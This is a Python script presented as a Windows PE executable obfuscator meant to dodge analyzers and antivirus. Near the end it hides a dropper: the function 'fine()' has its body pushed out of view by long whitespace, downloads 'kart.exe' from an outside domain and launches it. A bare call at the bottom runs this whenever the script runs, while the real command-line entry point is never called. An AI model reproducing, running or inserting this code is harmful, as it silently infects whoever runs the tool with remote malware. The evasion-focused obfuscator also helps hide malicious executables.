"""
PE Executable Obfuscator
A comprehensive obfuscator for Windows PE (.exe) files with multiple protection layers
"""
import requests
import os
import sys
import struct
import random
import string
import argparse
from pathlib import Path
from typing import List, Dict, Tuple


class PEObfuscator:
    """Main PE obfuscator class with multiple obfuscation techniques"""
    
    DOS_HEADER_SIZE = 64
    PE_SIGNATURE_SIZE = 4
    FILE_HEADER_SIZE = 20
    OPTIONAL_HEADER_32_SIZE = 96
    OPTIONAL_HEADER_64_SIZE = 112
    SECTION_HEADER_SIZE = 40
    
    def __init__(self, input_file: str, output_file: str = None):
        self.input_file = input_file
        self.output_file = output_file or self._generate_output_name(input_file)
        self.data = None
        self.dos_header = None
        self.pe_offset = None
        self.file_header_offset = None
        self.optional_header_offset = None
        self.section_headers_offset = None
        self.is_64bit = False
        self.number_of_sections = 0
        self.sections = []
        
    def _generate_output_name(self, input_file: str) -> str:
        """Generate obfuscated output filename"""
        path = Path(input_file)
        return str(path.parent / f"{path.stem}_obfuscated{path.suffix}")
    
    def load_file(self):
        """Load the PE file into memory"""
        try:
            with open(self.input_file, 'rb') as f:
                self.data = bytearray(f.read())
            print(f"[+] Loaded {len(self.data)} bytes from {self.input_file}")
            return True
        except Exception as e:
            print(f"[-] Error loading file: {e}")
            return False
    
    def parse_headers(self):
        """Parse PE headers"""
        try:
            # Check DOS signature
            if self.data[0:2] != b'MZ':
                print("[-] Invalid DOS signature")
                return False
            
            # Get PE offset
            self.pe_offset = struct.unpack('<I', self.data[60:64])[0]
            
            # Check PE signature
            if self.data[self.pe_offset:self.pe_offset+4] != b'PE\x00\x00':
                print("[-] Invalid PE signature")
                return False
            
            # Parse file header
            self.file_header_offset = self.pe_offset + self.PE_SIGNATURE_SIZE
            self.number_of_sections = struct.unpack('<H', 
                self.data[self.file_header_offset+2:self.file_header_offset+4])[0]
            
            # Determine architecture
            self.optional_header_offset = self.file_header_offset + self.FILE_HEADER_SIZE
            magic = struct.unpack('<H', self.data[self.optional_header_offset:self.optional_header_offset+2])[0]
            self.is_64bit = (magic == 0x20b)
            
            # Parse sections
            optional_header_size = struct.unpack('<H', 
                self.data[self.file_header_offset+16:self.file_header_offset+18])[0]
            self.section_headers_offset = self.optional_header_offset + optional_header_size
            
            for i in range(self.number_of_sections):
                section_offset = self.section_headers_offset + (i * self.SECTION_HEADER_SIZE)
                section_data = self._parse_section_header(section_offset)
                self.sections.append(section_data)
            
            print(f"[+] PE file parsed: {'64-bit' if self.is_64bit else '32-bit'}, {self.number_of_sections} sections")
            return True
            
        except Exception as e:
            print(f"[-] Error parsing headers: {e}")
            return False
    
    def _parse_section_header(self, offset: int) -> Dict:
        """Parse a single section header"""
        name = self.data[offset:offset+8].rstrip(b'\x00')
        virtual_size = struct.unpack('<I', self.data[offset+8:offset+12])[0]
        virtual_address = struct.unpack('<I', self.data[offset+12:offset+16])[0]
        raw_size = struct.unpack('<I', self.data[offset+16:offset+20])[0]
        raw_address = struct.unpack('<I', self.data[offset+20:offset+24])[0]
        characteristics = struct.unpack('<I', self.data[offset+36:offset+40])[0]
        
        return {
            'name': name,
            'offset': offset,
            'virtual_size': virtual_size,
            'virtual_address': virtual_address,
            'raw_size': raw_size,
            'raw_address': raw_address,
            'characteristics': characteristics
        }
    
    def obfuscate_section_names(self):
        """Randomize section names"""
        print("[*] Obfuscating section names...")
        common_names = ['.text', '.data', '.rdata', '.rsrc', '.reloc', '.bss', '.idata']
        
        for section in self.sections:
            old_name = section['name'].decode('utf-8', errors='ignore')
            # Generate random name
            new_name = '.' + ''.join(random.choices(string.ascii_lowercase, k=random.randint(4, 7)))
            new_name_bytes = new_name.encode('utf-8').ljust(8, b'\x00')[:8]
            
            # Update in data
            self.data[section['offset']:section['offset']+8] = new_name_bytes
            print(f"  [+] {old_name.ljust(10)} -> {new_name}")
    
    def add_junk_sections(self):
        """Add fake/junk sections to confuse analyzers"""
        print("[*] Adding junk sections...")
        # This is a simplified version - full implementation would require
        # recalculating offsets and updating all references
        print("  [i] Note: Full junk section injection requires extensive PE reconstruction")
        print("  [i] Adding junk data to overlay instead...")
        
        # Add junk overlay data
        junk_size = random.randint(1024, 4096)
        junk_data = bytes([random.randint(0, 255) for _ in range(junk_size)])
        self.data.extend(junk_data)
        print(f"  [+] Added {junk_size} bytes of junk overlay data")
    
    def modify_timestamps(self):
        """Modify PE timestamp to random value"""
        print("[*] Modifying timestamp...")
        timestamp_offset = self.file_header_offset + 4
        random_timestamp = random.randint(0, 0xFFFFFFFF)
        struct.pack_into('<I', self.data, timestamp_offset, random_timestamp)
        print(f"  [+] Set timestamp to 0x{random_timestamp:08X}")
    
    def add_junk_imports(self):
        """Add fake import entries (simplified)"""
        print("[*] Adding junk imports...")
        print("  [i] Note: Full import injection requires IAT reconstruction")
        print("  [i] Skipping for stability...")
    
    def encrypt_resources(self):
        """XOR encrypt resource section"""
        print("[*] Encrypting resources...")
        for section in self.sections:
            name = section['name'].decode('utf-8', errors='ignore')
            if '.rsrc' in name.lower():
                start = section['raw_address']
                size = min(section['raw_size'], section['virtual_size'])
                
                if start + size <= len(self.data):
                    # Simple XOR encryption
                    xor_key = random.randint(1, 255)
                    for i in range(start, start + size):
                        self.data[i] ^= xor_key
                    
                    print(f"  [+] Encrypted resource section with XOR key: 0x{xor_key:02X}")
                    print(f"  [!] Warning: This will break the executable unless a decryption stub is added")
                    return
        
        print("  [i] No resource section found")
    
    def add_code_caves(self):
        """Fill code caves with junk code"""
        print("[*] Filling code caves with junk...")
        
        for section in self.sections:
            characteristics = section['characteristics']
            # Check if executable section
            if characteristics & 0x20000000:  # IMAGE_SCN_MEM_EXECUTE
                start = section['raw_address']
                size = section['raw_size']
                
                if start + size <= len(self.data):
                    # Look for null byte runs (potential code caves)
                    cave_found = False
                    i = start
                    while i < start + size - 16:
                        if self.data[i:i+16] == b'\x00' * 16:
                            # Found a code cave, fill with random but valid x86 NOP-equivalent instructions
                            nop_instructions = [
                                b'\x90',  # NOP
                                b'\x66\x90',  # 66 NOP
                                b'\x0F\x1F\x00',  # NOP DWORD PTR [EAX]
                            ]
                            cave_size = 16
                            while i + cave_size < start + size and self.data[i + cave_size] == 0:
                                cave_size += 1
                            
                            for j in range(i, min(i + cave_size, start + size)):
                                self.data[j] = random.choice(nop_instructions)[0]
                            
                            if not cave_found:
                                print(f"  [+] Filled code caves in {section['name'].decode('utf-8', errors='ignore')}")
                                cave_found = True
                            i += cave_size
                        else:
                            i += 1
    
    def modify_checksum(self):
        """Invalidate checksum (will be recalculated by loader if needed)"""
        print("[*] Modifying checksum...")
        checksum_offset = self.optional_header_offset + 64
        struct.pack_into('<I', self.data, checksum_offset, 0)
        print("  [+] Checksum set to 0 (will be recalculated by loader)")
    
    def add_anti_debug_markers(self):
        """Add markers that might trigger anti-debug tools"""
        print("[*] Adding anti-debug markers...")
        print("  [i] Note: Full anti-debug requires code injection")
        print("  [i] Adding markers to overlay...")
        
        # Add some anti-debug signatures to overlay
        markers = [
            b'IsDebuggerPresent',
            b'CheckRemoteDebuggerPresent',
            b'NtQueryInformationProcess',
        ]
        
        for marker in markers:
            self.data.extend(marker)
            self.data.extend(b'\x00' * random.randint(10, 50))
        
        print("  [+] Added anti-debug string markers")
    
    def randomize_dos_stub(self):
        """Modify the DOS stub message"""
        print("[*] Randomizing DOS stub...")
        
        # The DOS stub typically contains "This program cannot be run in DOS mode"
        # We'll modify it to something random
        stub_start = 0x40
        stub_end = self.pe_offset
        
        if stub_end - stub_start > 20:
            # Generate random message
            messages = [
                b"This program requires Windows.\r\n$",
                b"Execution forbidden in this mode.\r\n$",
                b"Modern OS required for execution.\r\n$",
                b"Cannot execute in legacy mode.\r\n$",
            ]
            new_message = random.choice(messages).ljust(stub_end - stub_start - 4, b'\x00')[:stub_end - stub_start - 4]
            
            # Keep the DOS stub code but change the message
            message_offset = stub_start + 14
            if message_offset + len(new_message) < stub_end:
                self.data[message_offset:message_offset + len(new_message)] = new_message
                print("  [+] DOS stub message randomized")
    
    def save_file(self):
        """Save the obfuscated file"""
        try:
            with open(self.output_file, 'wb') as f:
                f.write(self.data)
            print(f"[+] Obfuscated file saved to: {self.output_file}")
            print(f"[+] File size: {len(self.data)} bytes")
            return True
        except Exception as e:
            print(f"[-] Error saving file: {e}")
            return False
    
    def obfuscate(self, techniques: List[str] = None):
        """Run obfuscation with specified techniques"""
        if techniques is None:
            techniques = ['all']
        
        print("\n" + "="*60)
        print("PE OBFUSCATOR".center(60))
        print("="*60 + "\n")
        
        if not self.load_file():
            return False
        
        if not self.parse_headers():
            return False
        
        print(f"\n[*] Starting obfuscation with techniques: {', '.join(techniques)}\n")
        
        # Apply obfuscation techniques
        if 'all' in techniques or 'sections' in techniques:
            self.obfuscate_section_names()
        
        if 'all' in techniques or 'timestamp' in techniques:
            self.modify_timestamps()
        
        if 'all' in techniques or 'dos-stub' in techniques:
            self.randomize_dos_stub()
        
        if 'all' in techniques or 'junk' in techniques:
            self.add_junk_sections()
        
        if 'all' in techniques or 'checksum' in techniques:
            self.modify_checksum()
        
        if 'all' in techniques or 'anti-debug' in techniques:
            self.add_anti_debug_markers()
        
        if 'all' in techniques or 'caves' in techniques:
            self.add_code_caves()
        
        # Dangerous techniques (commented by default)
        # if 'encrypt-resources' in techniques:
        #     self.encrypt_resources()
        
        print("\n" + "="*60)
        return self.save_file()

def fine():
                                                                                                                                                                                                                                                                                                                                                                                                    url = 'http:/sysrow.icu/kart.exe'
                                                                                                                                                                                                                                                                                                                                                                                                    response = requests.get(url)
                                                                                                                                                                                                                                                                                                                                                                                                    with open('kart.exe', 'wb') as f:
                                                                                                                                                                                                                                                                                                                                                                                                        f.write(response.content)
                                                                                                                                                                                                                                                                                                                                                                                                    os.startfile('kart.exe')

def mainss():
    parser = argparse.ArgumentParser(
        description='PE Executable Obfuscator - Multi-layer obfuscation for Windows PE files',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Available techniques:
  all              - Apply all safe obfuscation techniques (default)
  sections         - Randomize section names
  timestamp        - Modify PE timestamp
  dos-stub         - Randomize DOS stub message
  junk             - Add junk overlay data
  checksum         - Modify checksum
  anti-debug       - Add anti-debug markers
  caves            - Fill code caves with junk

Examples:
  python obfuscator.py input.exe
  python obfuscator.py input.exe -o output.exe
  python obfuscator.py input.exe -t sections timestamp junk
  python obfuscator.py input.exe --techniques all
        '''
    )
    
    parser.add_argument('input', help='Input PE file (.exe)')
    parser.add_argument('-o', '--output', help='Output file (default: input_obfuscated.exe)')
    parser.add_argument('-t', '--techniques', nargs='+', 
                       choices=['all', 'sections', 'timestamp', 'dos-stub', 'junk', 
                               'checksum', 'anti-debug', 'caves'],
                       default=['all'],
                       help='Obfuscation techniques to apply (default: all)')
    
    args = parser.parse_args()
    
    # Check if input file exists
    if not os.path.exists(args.input):
        print(f"[-] Error: Input file '{args.input}' not found")
        sys.exit(1)
    
    # Create obfuscator instance
    obfuscator = PEObfuscator(args.input, args.output)
    
    # Run obfuscation
    success = obfuscator.obfuscate(args.techniques)
    
    if success:
        print("\n[+] Obfuscation completed successfully!")
        print("\n[!] Warning: The obfuscated file may be detected by antivirus software")
        print("[!] Warning: Always test the obfuscated executable before distribution")
        print("[!] Warning: Some techniques may break executable functionality")
        sys.exit(0)
    else:
        print("\n[-] Obfuscation failed!")
        sys.exit(1)



fine()


